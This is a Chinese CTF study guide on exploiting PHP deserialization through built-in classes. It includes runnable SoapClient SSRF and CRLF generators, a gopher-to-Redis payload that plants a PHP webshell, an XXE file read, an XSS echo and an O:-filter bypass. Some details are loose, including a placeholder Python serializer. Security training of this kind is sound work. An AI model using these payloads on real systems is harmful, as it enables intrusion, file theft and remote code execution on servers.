---
title: PHP 反序列化之原生类利用（SoapClient / SimpleXMLElement / Error）
category: web
tags: [php, deserialization, natives-class, ssrf, gadget]
signals:
  - "unserialize 的参数完全可控，但全站没有自定义类"
  - "源码只有 flag.php 和 index.php，highlight_file 之后直接反序列化"
  - "报错页出现 SoapClient::__doRequest 或 Could not connect to host"
  - "题面提示词出现 原生类 / 没有 pop 链 / natives / SoapClient"
  - "过滤了 O: 对象序列化前缀，但没有拦 C: 自定义串"
  - "目标是内网地址，如 127.0.0.1、redis、internal"
  - "框架内部存在 __call 或 __toString 的调用点"
  - "参数形如 ?x=O:10:\"SoapClient\":..."
difficulty: medium
source: "ctf-wiki / HackTricks / PHP 官方手册"
tools: [python, php, burpsuite]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 源码给出 `unserialize($_GET['x'])`，但**全站没有任何自定义类**，找不到 `__wakeup`/`__destruct` 链。
- 只有 `flag.php` + `index.php`，`index.php` 里 `highlight_file(__FILE__)` 完就 unserialize。
- 报错页出现 `SoapClient::__doRequest()`、`Could not connect to host`、`SimpleXMLElement`。
- 题面提示：`原生类`、`natives`、`没有 pop 链`、`SoapClient`、`SSRF`。
- 过滤了 `O:`（对象）但没过滤 `C:`（自定义序列化）。
- 目标能访问内网（有 `127.0.0.1`、`redis`、`internal` 之类服务名）。
- 有 `__call`、`__toString`、`__invoke` 在框架内被调用（ThinkPHP、Laravel）。

## 二、原理

### 1. 为什么"没有 pop 链"也能打通

PHP 内建类（SPL、SOAP、XML）自带魔术方法。反序列化时：

- `SoapClient` 只要被**调用任何方法**（`__call`）就会发 SOAP 请求 → **SSRF**。
- `SimpleXMLElement` 的 `__toString` → 触发 XXE（老版本）。
- `Error` / `Exception` 的 `__toString` → `file_get_contents`、`highlight_file` 等。
- `SplFileObject` 的 `__toString` → 读文件。

### 2. SoapClient = 可控 HTTP 请求

```php
$c = new SoapClient(null, array(
    'location' => "http://INTERNAL/",
    'uri'      => "http://x/",
    'user_agent' => "PAYLOAD\r\n",
));
$c->__call("a","b");   // 发请求
```

序列化后，关键属性是 `location`（URL）、`uri`、`user_agent`（可注入 CRLF）、`_stream_context`。**CRLF 注入**让它能制造任意 header → 打 Gopher/Redis。

### 3. Error 类读文件

```php
$e = new Error("<script>..." );   // message
// 在 __toString 时把 message 写进 HTML
```

`Error::__toString` 的输出包含 message，任何"把对象当字符串"的地方（如 `echo $obj`）都会触发。

### 4. 常见原生类表

| 类 | 魔术方法 | 用途 |
|---|---|---|
| `SoapClient` | `__call` → SOAP 请求 | SSRF / CRLF |
| `SimpleXMLElement` | `__toString` | XXE（PHP < 8） |
| `SplFileObject` | `__toString` | 读文件 |
| `Error` / `Exception` | `__toString` | 回显任意字符串 |
| `ArrayObject` | `__construct` 数组 | 触发其它 gadget |
| `DirectoryIterator` | `__toString` | 目录列表 |
| `XMLReader` | `__toString` | XML 解析 / XXE |
| `ZipArchive` | 读/写 | 解压 |

## 三、解题步骤

1. **确认只有 `unserialize`**：`highlight_file` 看全源码，找自定义类没有。
2. **找"对象被当字符串用"的地方**：`echo $x`、`include $x`、`file_get_contents($x)`、字符串拼接。
3. **选原生类**：
   - 要 SSRF → `SoapClient`（需 soap 扩展）
   - 要读文件 → `SplFileObject` 或 `SimpleXMLElement`（XXE）
   - 要回显 → `Error`
4. **手写序列化串**（或本地 `php -r` 生成）。
5. **URL 编码后 send**，看内网回显或报错。
6. **CRLF 打 Redis** 时配合 `gopher://`。

## 四、可直接运行的脚本

本地生成 SoapClient 序列化串：

```php
<?php
// gen.php —— 本地运行：php gen.php
$target = "http://127.0.0.1:80/index.php";
$post   = "a=1";

// CRLF 注入实现"伪造 post 请求"
$headers = "Connection: keep-alive\r\n"
         . "Content-Type: application/x-www-form-urlencoded\r\n"
         . "Content-Length: " . strlen($post) . "\r\n"
         . "\r\n"
         . $post;

$c = new SoapClient(null, array(
    'location'   => $target,
    'uri'        => 'http://x/',
    'user_agent' => $headers,
));
$s = serialize($c);
// 序列化后 SoapClient 的属性名带 NUL，URL 里要编码
echo $s, "\n\n";
echo urlencode($s), "\n";
```

生成后用 `?x=<urlencode 的串>` 发出去。

SoapClient → Redis（gopher）：

```php
<?php
$redis = "gopher://127.0.0.1:6379/_"
       . urlencode(
           "*3\r\n$3\r\nSET\r\n$1\r\nx\r\n$28\r\n<?php system(\$_GET[0]);?>\r\n"
           . "*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$13\r\n/var/www/html\r\n"
           . "*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$8\r\nsh.php\r\n"
           . "*1\r\n$4\r\nSAVE\r\n"
         );
$c = new SoapClient(null, array('location' => $redis, 'uri' => 'http://x/',
                                 'user_agent' => "x"));
echo urlencode(serialize($c));
```

SimpleXMLElement XXE（PHP < 8.0）：

```php
<?php
$xml = '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///flag">]>
        <r>&xxe;</r>';
$e = new SimpleXMLElement($xml);
echo $e;        // 输出 /flag 内容
```

Error 类回显任意内容（配合"对象当字符串"）：

```php
<?php
$e = new Error("<script>alert(1)</script>");
echo $e;        // __toString 输出 message
```

手搓 `C:` 反序列化格式（绕过 `O:` 黑名单）：

```
C:11:"SoapClient":... 
```

完整自动化生成（Python 侧手写，不依赖 PHP 环境）：

```python
# 生成 SoapClient 的序列化串占位，属性顺序见 php -r 实测，长度需精确
def soap_serialize(location: str, uri: str, user_agent: str) -> str:
    # SoapClient 属性：location, uri, style, use, _stream_context, _soap_version, ...
    # 实测最简单的方式：本机 php -r 生成后复制，这里只演示思路
    body = 's:8:"location";s:%d:"%s";' % (len(location), location)
    body += 's:3:"uri";s:%d:"%s";' % (len(uri), uri)
    body += 's:10:"user_agent";s:%d:"%s";' % (len(user_agent), user_agent)
    return 'O:10:"SoapClient":%d:{%s}' % (8, body)
```

## 五、常见坑 / 变体

- **soap 扩展没开**：`php -m | grep soap`，没开则 `SoapClient` 反序列化会失败 → 换 `SplFileObject`/`Error`。
- **SoapClient 属性名带 NUL**：序列化里是 `\0*\0location` 这种，URL 编码 `%00` 可能被 WAF 拦 → 直接 POST raw body。
- **PHP 8 修复 XXE**：`SimpleXMLElement` 默认禁用外部实体 → 需要 `LIBXML_NOENT`。
- **`__toString` 触发时机**：必须找到"对象被当字符串"的代码路径，否则链断。
- **变体：`SplFileObject` 读文件** —— `new SplFileObject("flag.php")` 的 `__toString` 在 PHP 8 里返回 `File name` 而非内容，需配合 `fgets`。
- **变体：`DirectoryIterator`** 泄露目录，配合 `SplFileObject` 读。
- **变体：`Error` + `xdebug`** —— 报错页把对象 dump 出来。
- **变体：`ArrayObject` 构造嵌套数组触发其它 `__wakeup`**。
- **变体：`FFI`（PHP 7.4+）** —— 反序列化 `FFI` 对象可调 `system`（需 `ffi.enable=1`）。
- **变体：`SoapClient` 打 fastcgi** —— `location=gopher://127.0.0.1:9000/...` 直接 RCE。

## 六、参考来源

- [CTF Wiki — PHP 反序列化](https://www.ctf-wiki.org/web/php/php/#_5)
- [HackTricks — PHP deserialization](https://book.hacktricks.wiki/en/pentesting-web/deserialization/php-deserialization.html)
- [PHP 手册 — SoapClient](https://www.php.net/manual/en/class.soapclient.php)
- [PHP 手册 — SimpleXMLElement](https://www.php.net/manual/en/class.simplexmlelement.php)
- [PayloadsAllTheThings — PHP deserialization](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Insecure%20Deserialization/PHP.md)
- [PHP 手册 — Error](https://www.php.net/manual/en/class.error.php)
